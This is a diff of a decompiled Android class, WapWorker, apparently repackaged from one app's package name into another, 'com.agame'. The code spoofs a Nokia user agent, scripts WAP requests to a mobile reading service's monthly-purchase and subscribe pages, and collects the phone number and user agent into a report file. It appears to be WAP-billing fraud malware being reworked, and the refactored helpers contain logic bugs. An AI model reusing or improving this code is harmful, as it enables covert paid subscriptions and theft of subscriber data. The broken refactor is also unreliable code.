@@ -2,15 +2,6 @@
 
 package com.agame.http;
 
-import android.content.Context;
-import com.tyj.onepiece.http.beans.Param;
-import com.tyj.onepiece.http.beans.WapUrl;
-import com.tyj.onepiece.http.common.Base64;
-import com.tyj.onepiece.http.common.CommUtil;
-import com.tyj.onepiece.http.common.Constants;
-import com.tyj.onepiece.http.common.IniReader;
-import com.tyj.onepiece.http.common.IniReader$Section;
-import com.tyj.onepiece.http.common.LogUtil;
 import java.io.FileReader;
 import java.io.IOException;
 import java.io.StringReader;
@@ -19,9 +10,11 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.ParserConfigurationException;
+
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
@@ -29,36 +22,47 @@ import org.w3c.dom.NodeList;
 import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 
+import android.content.Context;
+import android.util.Base64;
+
+import com.agame.http.beans.Param;
+import com.agame.http.beans.WapUrl;
+import com.agame.http.common.CommUtil;
+import com.agame.http.common.Constants;
+import com.agame.http.common.IniReader;
+import com.agame.http.common.IniReader.Section;
+import com.agame.http.common.LogUtil;
+
 public class WapWorker {
-    private Context ctx;
-    private Map globalparamlst;
-    private HttpUtils httptl;
-    private LogUtil log;
-    private ArrayList paramlist;
-    int ppp;
-    public ArrayList sendlst;
-    private String statics_addr;
-    public String strUserAgent;
-    private String strnumber;
-    private int wapindex;
+        private Context ctx;
+        private Map<String, String> globalparamlst;
+        private HttpUtils httptl;
+        private LogUtil log;
+        private ArrayList<Param> paramlist;
+        int ppp;
+        public ArrayList sendlst;
+        private String statics_addr;
+        public String strUserAgent;
+        private String strnumber;
+        private int wapindex;
 
-    public WapWorker(Context _ctx) {
-        super();
-        this.sendlst = new ArrayList();
-        this.strUserAgent = "NokiaN81";
-        this.wapindex = 0;
-        this.globalparamlst = new HashMap();
-        this.paramlist = new ArrayList();
-        this.ppp = 1;
-        this.ctx = _ctx;
-        this.log = ServiceInstance.log;
-    }
+        public WapWorker(Context _ctx) {
+                super();
+                this.sendlst = new ArrayList();
+                this.strUserAgent = "NokiaN81";
+                this.wapindex = 0;
+                this.globalparamlst = new HashMap<String, String>();
+                this.paramlist = new ArrayList<Param>();
+                this.ppp = 1;
+                this.ctx = _ctx;
+                this.log = ServiceInstance.log;
+        }
 
-    public void add_wapurl(String strurl) {
-        this.sendlst.add(strurl);
-    }
+        public void add_wapurl(String strurl) {
+                this.sendlst.add(strurl);
+        }
 
-    public int doAction() {
+        public int doAction() {
         IniReader v1;
         int v3 = -1;
         try {
@@ -105,36 +109,33 @@ public class WapWorker {
         return v3;
     }
 
-    private byte[] do_http_work(WapUrl wl) {
-        byte[] v10 = null;
-        if(this.getstrlen(wl.wpurl) > 0) {
-            wl.wpurl = CommUtil.encodeurl(wl.wpurl);
-            this.httptl.user_agent = this.strUserAgent;
-            if(wl.body == null) {
-                if(wl.httptype != 0 && wl.httptype != 2) {
-                    return this.httptl.httppostbyte(wl.wpurl, null, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+        private byte[] do_http_work(WapUrl wl) {
+                byte[] v10 = null;
+                if (this.getstrlen(wl.wpurl) > 0) {
+                        wl.wpurl = CommUtil.encodeurl(wl.wpurl);
+                        this.httptl.user_agent = this.strUserAgent;
+                        if (wl.body == null) {
+                                if (wl.httptype != 0 && wl.httptype != 2) {
+                                        return this.httptl.httppostbyte(wl.wpurl, null, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+                                }
+
+                                v10 = this.httptl.httpgetbyte(wl.wpurl, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+                        } else if (wl.httptype == 3) {
+                                this.log.trace("post msg", new String(wl.body));
+                                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "post900", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+                        } else if (wl.httptype == 1) {
+                                this.log.trace("post msg", new String(wl.body));
+                                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+                        } else {
+                                this.log.trace("get msg", new String(wl.body));
+                                v10 = this.httptl.httpgetbyte(String.valueOf(wl.wpurl) + "&" + wl.body, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
+                        }
                 }
 
-                v10 = this.httptl.httpgetbyte(wl.wpurl, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
-            }
-            else if(wl.httptype == 3) {
-                this.log.trace("post msg", new String(wl.body));
-                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "post900", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
-            }
-            else if(wl.httptype == 1) {
-                this.log.trace("post msg", new String(wl.body));
-                v10 = this.httptl.httppostbyte(wl.wpurl, wl.body, "", 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
-            }
-            else {
-                this.log.trace("get msg", new String(wl.body));
-                v10 = this.httptl.httpgetbyte(String.valueOf(wl.wpurl) + "&" + wl.body, 0, wl.accessbytecount - 1, wl.is_setrefer, wl.is_setcookie);
-            }
+                return v10;
         }
 
-        return v10;
-    }
-
-    private int do_wap_request(String strwapurl) {
+        private int do_wap_request(String strwapurl) {
         int v8;
         if(this.getstrlen(strwapurl) == 0 || !strwapurl.contains(";")) {
             this.log.trace("wap", "wapurl null or ;");
@@ -183,68 +184,66 @@ public class WapWorker {
         return v8;
     }
 
-    private int do_wapbycm() {
-        int v4 = 0;
-        int v9 = -111;
-        this.log.trace("wap", "wapcm start");
-        int v1 = 0;
-        int v0 = this.sendlst.size();
-        this.wapindex = 0;
-        this.httptl = new HttpUtils(this.ctx);
-        while(this.wapindex < v0) {
-            this.log.trace("", "");
-            this.log.trace("wap", "step " + (this.wapindex + 1) + " start ");
-            v1 = this.do_wap_request(this.sendlst.get(this.wapindex));
-            if(v1 != 0 && v1 != v9) {
-                break;
-            }
+        private int do_wapbycm() {
+                int v4 = 0;
+                int v9 = -111;
+                this.log.trace("wap", "wapcm start");
+                int v1 = 0;
+                int v0 = this.sendlst.size();
+                this.wapindex = 0;
+                this.httptl = new HttpUtils(this.ctx);
+                while (this.wapindex < v0) {
+                        this.log.trace("", "");
+                        this.log.trace("wap", "step " + (this.wapindex + 1) + " start ");
+                        v1 = this.do_wap_request(this.sendlst.get(this.wapindex));
+                        if (v1 != 0 && v1 != v9) {
+                                break;
+                        }
 
-            if(v1 == v9) {
-                this.log.trace("wap", "quit wap because ordered already");
-                String v2 = String.valueOf(this.statics_addr) + ";2;0;0;0;;;param10;;;;;";
-                this.log.trace("wap", v2);
-                this.wapindex = v0;
-                v1 = this.do_wap_request(v2);
-                break;
-            }
+                        if (v1 == v9) {
+                                this.log.trace("wap", "quit wap because ordered already");
+                                String v2 = String.valueOf(this.statics_addr) + ";2;0;0;0;;;param10;;;;;";
+                                this.log.trace("wap", v2);
+                                this.wapindex = v0;
+                                v1 = this.do_wap_request(v2);
+                                break;
+                        }
 
-            ++this.wapindex;
+                        ++this.wapindex;
+                }
+
+                this.log.trace("wap", "wapcm end ");
+                if (v1 != 0 || this.wapindex != v0) {
+                        this.log.trace("wap", "step error " + (this.wapindex + 1));
+                        v4 = this.wapindex + 1;
+                } else {
+                        this.log.trace("wap", "all step ok");
+                }
+
+                return v4;
         }
 
-        this.log.trace("wap", "wapcm end ");
-        if(v1 != 0 || this.wapindex != v0) {
-            this.log.trace("wap", "step error " + (this.wapindex + 1));
-            v4 = this.wapindex + 1;
-        }
-        else {
-            this.log.trace("wap", "all step ok");
-        }
+        public boolean dotestAction() {
+                boolean v1;
+                this.log.trace("wap", "do testAction");
+                this.add_wapurl("http://wap.cmread.com/r/a/lj?&s=/p/buyMonthC.jsp&nid=396257292&cm=M5920004;2;0;0;0;;;param3;;;;;");
+                this.add_wapurl("{param3};2;0;0;0;;;param4;http://wap.cmread.com~a~<a href~>~(subscribe.jsp&&&|&&&)~~~href~~;;;;");
+                int v0 = -1;
+                if (this.sendlst.size() > 0) {
+                        v0 = this.do_wapbycm();
+                }
 
-        return v4;
-    }
+                if (v0 != 0) {
+                        this.log.trace("wap", "wapcm error");
+                        v1 = false;
+                } else {
+                        v1 = true;
+                }
 
-    public boolean dotestAction() {
-        boolean v1;
-        this.log.trace("wap", "do testAction");
-        this.add_wapurl("http://wap.cmread.com/r/a/lj?&s=/p/buyMonthC.jsp&nid=396257292&cm=M5920004;2;0;0;0;;;param3;;;;;");
-        this.add_wapurl("{param3};2;0;0;0;;;param4;http://wap.cmread.com~a~<a href~>~(subscribe.jsp&&&|&&&)~~~href~~;;;;");
-        int v0 = -1;
-        if(this.sendlst.size() > 0) {
-            v0 = this.do_wapbycm();
+                return v1;
         }
 
-        if(v0 != 0) {
-            this.log.trace("wap", "wapcm error");
-            v1 = false;
-        }
-        else {
-            v1 = true;
-        }
-
-        return v1;
-    }
-
-    public String findurl(byte[] data, String node, String prop, String left, String right, String host, String rule, String postfmt, String urlparam) {
+        public String findurl(byte[] data, String node, String prop, String left, String right, String host, String rule, String postfmt, String urlparam) {
         int v17;
         int v15;
         String[] v14;
@@ -493,51 +492,48 @@ public class WapWorker {
         return v26;
     }
 
-    public int getMouaByNet() {
-        int v4 = 0;
-        int v5 = -1;
-        int v1 = 0;
-        int v0 = this.sendlst.size();
-        this.wapindex = 0;
-        this.httptl = new HttpUtils(this.ctx);
-        do {
-            if(this.wapindex >= v0) {
-                break;
-            }
+        public int getMouaByNet() {
+                int v4 = 0;
+                int v5 = -1;
+                int v1 = 0;
+                int v0 = this.sendlst.size();
+                this.wapindex = 0;
+                this.httptl = new HttpUtils(this.ctx);
+                do {
+                        if (this.wapindex >= v0) {
+                                break;
+                        }
 
-            Object v3 = this.sendlst.get(this.wapindex);
-            ++this.wapindex;
-            v1 = this.do_wap_request(((String)v3));
-        }
-        while(v1 == 0);
+                        Object v3 = this.sendlst.get(this.wapindex);
+                        ++this.wapindex;
+                        v1 = this.do_wap_request(((String) v3));
+                } while (v1 == 0);
 
-        if(v1 == 0) {
-            this.strnumber = this.get_globalparam("number");
-            String v2 = this.get_globalparam("ua");
-            this.log.trace("moua number:", this.strnumber);
-            this.log.trace("moua ua:", v2);
-            if(this.strnumber != null && this.strnumber.length() != 0 && !this.strnumber.equalsIgnoreCase("0")) {
-                if(this.strnumber.equalsIgnoreCase("13000000000")) {
-                    v4 = -2;
-                }
-                else {
-                    CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "number", this.strnumber);
-                    CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "ua", v2);
+                if (v1 == 0) {
+                        this.strnumber = this.get_globalparam("number");
+                        String v2 = this.get_globalparam("ua");
+                        this.log.trace("moua number:", this.strnumber);
+                        this.log.trace("moua ua:", v2);
+                        if (this.strnumber != null && this.strnumber.length() != 0 && !this.strnumber.equalsIgnoreCase("0")) {
+                                if (this.strnumber.equalsIgnoreCase("13000000000")) {
+                                        v4 = -2;
+                                } else {
+                                        CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "number", this.strnumber);
+                                        CommUtil.setKeyValueNode(Constants.REPORT_PATH(this.ctx), "report", "ua", v2);
+                                }
+
+                                return v4;
+                        }
+
+                        v4 = v5;
+                } else {
+                        v4 = v5;
                 }
 
                 return v4;
-            }
-
-            v4 = v5;
-        }
-        else {
-            v4 = v5;
         }
 
-        return v4;
-    }
-
-    private int getWapUrl(String strwapurl, WapUrl url) {
+        private int getWapUrl(String strwapurl, WapUrl url) {
         int v3;
         IniReader v0;
         String v27;
@@ -692,113 +688,154 @@ public class WapWorker {
         return v3;
     }
 
-    public String get_globalparam(String key) {
-        Object v0;
-        if((this.globalparamlst.isEmpty()) || !this.globalparamlst.containsKey(key)) {
-            String v0_1 = "";
-        }
-        else {
-            v0 = this.globalparamlst.get(key);
+        public String get_globalparam(String key) {
+                if (globalparamlst.isEmpty() || !globalparamlst.containsKey(key))
+                        return "";
+                else
+                        return globalparamlst.get(key);
+                // Object v0;
+                // if ((this.globalparamlst.isEmpty()) || !this.globalparamlst.containsKey(key)) {
+                // String v0_1 = "";
+                // } else {
+                // v0 = this.globalparamlst.get(key);
+                // }
+                //
+                // return ((String) v0);
         }
 
-        return ((String)v0);
-    }
-
-    private byte[] getparam(String label_param) {
-        byte[] v2;
-        int v1 = this.paramlist.size();
-        int v0 = 0;
-        while(true) {
-            if(v0 >= v1) {
+        private byte[] getparam(String label_param) {
+                // if (this.paramlist.size() == 0)
+                // return null;
+                for (int i = 0; i < this.paramlist.size(); i++) {
+                        if (this.paramlist.get(i).key.equalsIgnoreCase(label_param)) {
+                                return this.paramlist.get(i).value;
+                        }
+                }
                 return null;
-            }
-            else if(this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
-                v2 = this.paramlist.get(v0).value;
-            }
-            else {
-                ++v0;
-                continue;
-            }
-
-            return v2;
+                //
+                // byte[] v2;
+                // int v1 = this.paramlist.size();
+                // int v0 = 0;
+                // while (true) {
+                // if (v0 >= v1) {
+                // return null;
+                // } else if (this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
+                // v2 = this.paramlist.get(v0).value;
+                // } else {
+                // ++v0;
+                // continue;
+                // }
+                //
+                // return v2;
+                // }
+                //
+                // return null;
         }
 
-        return null;
-    }
+        private int getstrlen(String str) {
+                int v0 = str == null ? 0 : str.length();
+                return v0;
+        }
 
-    private int getstrlen(String str) {
-        int v0 = str == null ? 0 : str.length();
-        return v0;
-    }
+        private String getwapfmt9rule(String subformat) {
+                String v0 = subformat.contains("(") ? CommUtil.getparamValue(subformat) : "";
+                return v0;
+        }
 
-    private String getwapfmt9rule(String subformat) {
-        String v0 = subformat.contains("(") ? CommUtil.getparamValue(subformat) : "";
-        return v0;
-    }
+        private int matchrule(String data, String rule) {
+                String[] ruleArray = rule.split("\\|");
+                int v0 = 1;
+                int v4 = 1;
+                for (int i = 0; i < ruleArray.length; i++) {
+                        String[] v9 = ruleArray[i].split("\\&");
+                        for (int j = 0; j < v9.length; j++) {
+                                if (!data.contains(v9[i])) {
+                                        v0 = 0;
+                                        v4 = 0;
+                                        break;
+                                }
+                        }
 
-    private int matchrule(String data, String rule) {
-        String[] v6 = rule.split("\\|");
-        int v4 = 1;
-        int v5 = v6.length;
-        int v2;
-        for(v2 = 0; v2 < v5; ++v2) {
-            String[] v9 = v6[v2].split("\\&");
-            int v0 = 1;
-            int v8 = v9.length;
-            if(v8 > 0) {
-                int v3 = 0;
-                while(v3 < v8) {
-                    if(!data.contains(v9[v3])) {
-                        v0 = 0;
-                        v4 = 0;
-                    }
-                    else {
-                        ++v3;
-                        continue;
-                    }
-
-                    break;
+                        if (v0 == 0) {
+                                break;
+                        } else {
+                                v4 = 1;
+                        }
                 }
 
-                if(v0 == 0) {
-                    goto label_16;
+                return v4 != 0 ? 0 : -1;
+                // --------------------------
+                // String[] v6 = rule.split("\\|");
+                // int v4 = 1;
+                // int v5 = v6.length;
+                // int v2;
+                // for(v2 = 0; v2 < v5; ++v2) {
+                // String[] v9 = v6[v2].split("\\&");
+                // int v0 = 1;
+                // int v8 = v9.length;
+                // if(v8 > 0) {
+                // int v3 = 0;
+                // while(v3 < v8) {
+                // if(!data.contains(v9[v3])) {
+                // v0 = 0;
+                // v4 = 0;
+                // }
+                // else {
+                // ++v3;
+                // continue;
+                // }
+                //
+                // break;
+                // }
+                //
+                // if(v0 == 0) {
+                // goto label_16;
+                // }
+                //
+                // v4 = 1;
+                // break;
+                // }
+                //
+                // label_16:
+                // }
+                //
+                // int v10 = v4 != 0 ? 0 : -1;
+                // return v10;
+        }
+
+        public void set_globalparam(String key, String value) {
+                this.globalparamlst.put(key, value);
+
+        }
+
+        private void setparam(String label_param, byte[] data) {
+                if (this.paramlist.size() == 0)
+                        return;
+
+                for (int i = 0; i < this.paramlist.size(); i++) {
+                        if (this.paramlist.get(i).key.equals(label_param)) {
+                                this.paramlist.get(i).value = data.clone();
+                                return;
+                        }
                 }
+                this.paramlist.add(new Param(label_param, data));
 
-                v4 = 1;
-                break;
-            }
-
-        label_16:
+                // int v1 = this.paramlist.size();
+                // int v0 = 0;
+                // while (true) {
+                // if (v0 >= v1) {
+                // break;
+                // } else if (this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
+                // this.paramlist.get(v0).value = null;
+                // this.paramlist.get(v0).value = data.clone();
+                // } else {
+                // ++v0;
+                // continue;
+                // }
+                //
+                // return;
+                // }
+                //
+                // this.paramlist.add(new Param(label_param, data));
         }
-
-        int v10 = v4 != 0 ? 0 : -1;
-        return v10;
-    }
-
-    public void set_globalparam(String key, String value) {
-        this.globalparamlst.put(key, value);
-    }
-
-    private void setparam(String label_param, byte[] data) {
-        int v1 = this.paramlist.size();
-        int v0 = 0;
-        while(true) {
-            if(v0 >= v1) {
-                break;
-            }
-            else if(this.paramlist.get(v0).key.equalsIgnoreCase(label_param)) {
-                this.paramlist.get(v0).value = null;
-                this.paramlist.get(v0).value = data.clone();
-            }
-            else {
-                ++v0;
-                continue;
-            }
-
-            return;
-        }
-
-        this.paramlist.add(new Param(label_param, data));
-    }
 }
-
